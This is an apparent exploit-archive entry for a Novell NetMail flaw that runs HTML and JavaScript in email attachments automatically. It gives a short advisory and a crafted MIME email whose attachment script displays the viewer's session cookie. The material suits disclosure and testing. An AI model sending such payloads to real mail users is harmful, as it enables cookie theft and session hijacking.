@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/14171/info
+
+Novell NetMail email client is prone to an input validation vulnerability.
+
+Reports indicate that HTML and JavaScript attached to received email messages is executed automatically, when the email message is viewed.
+
+A successful attack may allow the attacker to obtain session cookies and carry out other attacks.
+
+All versions are considered to be vulnerable at the moment. 
+
+Content-Type: multipart/mixed; boundary="=_mixed 00279444C2257036_="
+
+--=_mixed 00279444C2257036_=
+Content-Type: text/html; charset="US-ASCII"
+
+
+<br><font size=2 face="sans-serif">hi there</font>
+<br>
+--=_mixed 00279444C2257036_=
+Content-Type: text/html; name="malxxx.html"
+Content-Disposition: attachment; filename="malxxx.html"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<title>Test XSS of uploaded documents</title>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Diso-8859-1">
+
+</HEAD>
+<BODY>
+<SCRIPT>
+document.write('The cookie is:<br> ' + document.cookie + '<p>');
+</SCRIPT>
+</BODY></HTML>
+--=_mixed 00279444C2257036_=--
+
